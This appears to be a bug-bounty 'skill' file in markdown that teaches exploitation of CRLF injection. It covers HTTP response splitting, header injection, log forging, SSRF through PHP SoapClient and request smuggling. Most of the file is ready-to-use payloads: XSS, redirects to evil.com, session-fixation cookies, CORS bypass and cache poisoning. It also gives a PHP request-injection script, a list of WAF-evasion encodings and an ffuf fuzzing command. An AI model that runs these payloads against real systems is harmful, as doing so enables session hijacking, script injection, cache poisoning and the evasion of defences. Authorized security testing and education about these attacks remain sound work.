---
name: "crlf-injection"
version: "2.0"
category: "api"
subcategory: "injection"
phase: "exploitation"
tags: ["api", "bug-bounty", "crlf", "header-injection", "injection", "log-forging", "response-splitting", "access-control", "account-takeover", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["burp-suite", "adb", "burp", "ghauri", "sqlmap", "crlfuzz", "arjun", "authz", "autorize", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["http-header-injection", "http-request-smuggling", "cors-misconfiguration", "xss", "cache-poisoning-deception"]
description: "Bug bounty skill: crlf injection - exploitation phase, api category"
---
# CRLF (%0D%0A) Injection

## Summary

CRLF (Carriage Return `%0d` + Line Feed `%0a`) injection occurs when an attacker inserts CRLF sequences into HTTP requests or parameters. These characters terminate headers and separate headers from the body in HTTP/1.1. Exploitation leads to HTTP response splitting, header injection, cache poisoning, XSS, and log poisoning.

## Key Concepts

- **CRLF sequence**: `%0d%0a` (URL-encoded) terminates HTTP headers and separates headers from the response body
- **HTTP response splitting**: Injecting `%0d%0a%0d%0a` (double CRLF) ends the header section and starts a new response body, allowing attacker-controlled content
- **HTTP header injection**: Injecting a single CRLF enables adding arbitrary headers (cookies, CORS, redirects)
- **Log poisoning**: CRLF in request paths creates forged log entries that can mislead forensic analysis

## Technical Details

### CRLF Injection in Log Files

Attackers conceal malicious activity by injecting CRLF to forge log entries:

```
Normal log entry:
123.123.123.123 - 08:15 - /index.php?page=home

Injected request:
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit

Resulting log:
123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```

The injected CRLF makes a malicious `restrictedaction=edit` appear as if it came from localhost (127.0.0.1), a trusted source.

### HTTP Response Splitting → XSS

When user input is reflected in a response header without sanitization:

```
Request:
GET /?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script> HTTP/1.1

Response header becomes:
X-Custom-Header: Value

Response body becomes (after double CRLF):
<script>alert('XSS')</script>
```

The double CRLF (`%0d%0a%0d%0a`) terminates the header section. The browser parses `<script>` as the HTML body, executing the XSS.

### HTTP Response Splitting → Redirect

```
GET /%0d%0aLocation:%20http://myweb.com HTTP/1.1

Server response:
HTTP/1.1 200 OK
...
Location: http://myweb.com
```

The injected `Location` header redirects the victim to the attacker's site.

### CRLF in the URL Path

Injected directly into the URL path to control server response:

```
GET /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
```

Disables XSS protection and injects a script payload.

### HTTP Header Injection → CORS Bypass

Injecting `Access-Control-Allow-Origin` headers via CRLF enables cross-origin reads:

```
GET /somepage%0d%0aAccess-Control-Allow-Origin:%20* HTTP/1.1
```

The injected CORS header allows any origin to read the response.

### CRLF via PHP SoapClient (SSRF)

PHP's `SoapClient` allows CRLF injection in the `user_agent` parameter, enabling full HTTP request injection:

```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
    'POST /proxy HTTP/1.1',
    'Host: local.host.htb',
    'Cookie: PHPSESSID=[PHPSESSID]',
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: ' . (string)strlen($post_string),
    "\r\n",
    $post_string
);

$client = new SoapClient(null, array(
    'uri' => $target,
    'location' => $target,
    'user_agent' => "IGN\r\n\r\n" . join("\r\n", $crlf)
));

$client->__soapCall("test", []);
```

The `\r\n\r\n` in `user_agent` terminates the User-Agent header and injects a completely new POST request to an internal service.

### Request Chaining via CRLF

CRLF injection can chain multiple HTTP requests by keeping the connection alive:

```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```

**Malicious prefix injection** — poison the next user's request or cache:

```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1
```

### Request Smuggling via CRLF in HTTP/2 Header Values

HTTP/2 is binary and does not use delimiter characters — header boundaries are explicit offsets. This means `\r\n` can be embedded *inside* an HTTP/2 header value without splitting it. When the front-end downgrades to HTTP/1, the `\r\n` becomes a header delimiter, injecting headers (e.g., `Transfer-Encoding: chunked`) that bypass front-end filters validating Content-Length or stripping Transfer-Encoding:

```
# HTTP/2 (single header value, no split):
foo: bar\r\nTransfer-Encoding: chunked
# After H2 → HTTP/1 downgrade (two headers):
Foo: bar
Transfer-Encoding: chunked
```

Same trick in HTTP/1 (some parsers accept a lone `\n`):

```
GET / HTTP/1.1
Host: example.com
Foo: bar\nTransfer-Encoding: chunked
```

This is a full request-smuggling primitive — see `http-request-smuggling` skill (HTTP/2 Request Splitting / Vectors Unique to HTTP/2) for exploitation and payloads.

## Where to Find

- Parameters reflected in response **headers** (Set-Cookie, Location, redirect URLs)
- Redirect responses (301, 302, 303, 307, 308) — these commonly reflect user input in the `Location` header
- Custom headers, error pages, and logging endpoints
- Any parameter whose value appears in a response header

## Methodology

1. Focus on parameters that lead to redirects — check responses with status codes 301, 302, 303, 307, 308 for reflected input in headers.
2. Inject CRLF sequences (`%0d%0a`) and observe if headers are terminated.
3. Test double CRLF (`%0d%0a%0d%0a`) for response body injection.
4. Test in URL path, query parameters, and POST body.
5. If reflected, craft payloads for XSS, redirect, CORS bypass, or cookie injection.
6. For SSRF scenarios, test CRLF in User-Agent, Referer, or custom headers.

## Payloads

```
# Response splitting → XSS
%0d%0a%0d%0a<script>alert(document.domain)</script>

# Response splitting → Redirect
%0d%0aLocation:%20http://evil.com

# Header injection → CORS bypass
%0d%0aAccess-Control-Allow-Origin:%20*

# Header injection → Cookie
%0d%0aSet-Cookie:%20session=evil

# Log forging
%0d%0a127.0.0.1%20-%2008:15%20-%20/

# Combined (URL path)
%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E

# CRLF chained with Open Redirect
//www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
/google.com/%2F..%0D%0AHeader-Test:test2
/%0d%0aLocation:%20http://example.com

# CRLF → Disable XSS Protection + Inject Body
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
```

## Tools

- **Burp Suite Repeater** — Manual CRLF injection testing
- **Param Miner** — Discover reflected headers
- **CRLFuzz** — Fast CRLF injection scanner (https://github.com/dwisiswant0/crlfuzz)

## Bypass Techniques

### Mixed Encoding

```
# Standard
%0d%0a
# Mixed case
%0D%0A
%0d%0A
%0D%0a
# UTF-8 overlong encoding
%C0%8D%C0%8A
```

### Double Encoding

```
# Single encoded
%0d%0a
# Double encoded
%250d%250a
# Triple encoded
%25250d%25250a
```

### Unicode Variants

```
# Unicode Line Separator (U+2028) - sometimes works
%E2%80%A8
# Unicode Paragraph Separator (U+2029)
%E2%80%A9
# Unicode Line Feed
%C2%8A
# Unicode alternative chars (encode as UTF-8 bytes)
%E5%98%8A = %0A = \u560a
%E5%98%8D = %0D = \u560d
%E5%98%BE = %3E = \u563e (>)
%E5%98%BC = %3C = \u563c (<)
Example: %E5%98%8A%E5%98%8DSet-Cookie:%20test
```

### Alternative CRLF Characters

```
# Just line feed (LF) - some servers accept
%0a
# Just carriage return (CR) - some servers accept
%0d
# Combination with tab
%0d%09%0a
# Windows vs Linux style
%0d%0a (Windows)
%0a (Linux/Unix)
%0d (Mac)
```

### Parameter Pollution

```
# Split injection across parameters
?param1=%0d&param2=%0a
# Multiple CRLFs
%0d%0a%0d%0a
```

### Context-Specific Bypasses

```
# In URL path
/evil%0d%0a/../admin
# In query string
?redirect=http://evil.com%0d%0aX-Forwarded-For: 127.0.0.1
# In POST body
username=admin%0d%0a%0d%0a<script>alert(1)</script>
```

### WAF Bypass Patterns

- Use chunked encoding with injected CRLF
- Use HTTP/2 (some WAFs don't inspect HTTP/2 headers)
- Use different case: `%0D%0A`
- Use alternative encodings: `%0d%0a` vs `%0D%0A`
- Use line wrapping: `%0d%0a%20%20` (spaces)
- Use multiple injection points
- Spacing bypass: `%0d%0a%20%20Set-Cookie:%20session=evil`

### Detection Wordlist

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt

## Advanced Exploitation Scenarios

### Scenario 1: HTTP Response Splitting → XSS

```
GET /search?q=test%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### Scenario 2: Cookie Injection → Session Fixation

```
GET /redirect?url=https://example.com%0d%0aSet-Cookie:%20sessionid=evil123;%20domain=.target.com
```

### Scenario 3: Cache Poisoning

```
GET /page?lang=en%0d%0aX-Forwarded-For:%20127.0.0.1
```

Poisoned response cached and served to other users.

### Scenario 4: Proxy Bypass

```
GET http://internal-service%0d%0aHost:%20attacker.com
```

## WAF Detection & Bypass

### Test for WAF Presence

```
# Monitor response for blocked indicators
GET /param?test=%0d%0a
# If 403/406 → WAF detected
```

### WAF Bypass Patterns

- Use chunked encoding with injected CRLF
- Use HTTP/2 (some WAFs don't inspect HTTP/2 headers)
- Use different case: `%0D%0A`
- Use alternative encodings: `%0d%0a` vs `%0D%0A`
- Use line wrapping: `%0d%0a%20%20` (spaces)
- Use multiple injection points

### Bypass Example

```
# Blocked
GET /page?redirect=http://evil.com%0d%0aSet-Cookie:%20session=evil
# Bypass with spacing
GET /page?redirect=http://evil.com%0d%0a%20%20Set-Cookie:%20session=evil
```

## Testing Automation

### FFUF Automation

```
# Test multiple CRLF variants
ffuf -w crlf_payloads.txt -u https://target.com/redirect?url=FUZZ -mr "Set-Cookie"
```

### Custom CRLF Wordlist

```
%0d%0a
%0D%0A
%0d%0a%0d%0a
%250d%250a
%E2%80%A8
%E2%80%A9
%0d%09%0a
%0a%0d
%0d
%0a
```

## Notes

- CRLF injection requires user input reflected in response **headers** (not body)
- HTTP response splitting is often treated as high severity because it bypasses XSS filters and CSP
- SoapClient CRLF injection is a common CTF/real-world SSRF vector in PHP apps
- Modern frameworks (Express, Django, Rails) encode CRLF in headers by default — focus on legacy custom apps
- Log forging via CRLF is low severity but can hide attacker activity from WAF logs

## References

- https://book.hacktricks.xyz/pentesting-web/crlf-injection
- https://www.acunetix.com/websitesecurity/crlf-injection/
- https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md
- https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62
- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- https://www.netsparker.com/blog/web-security/crlf-http-header/
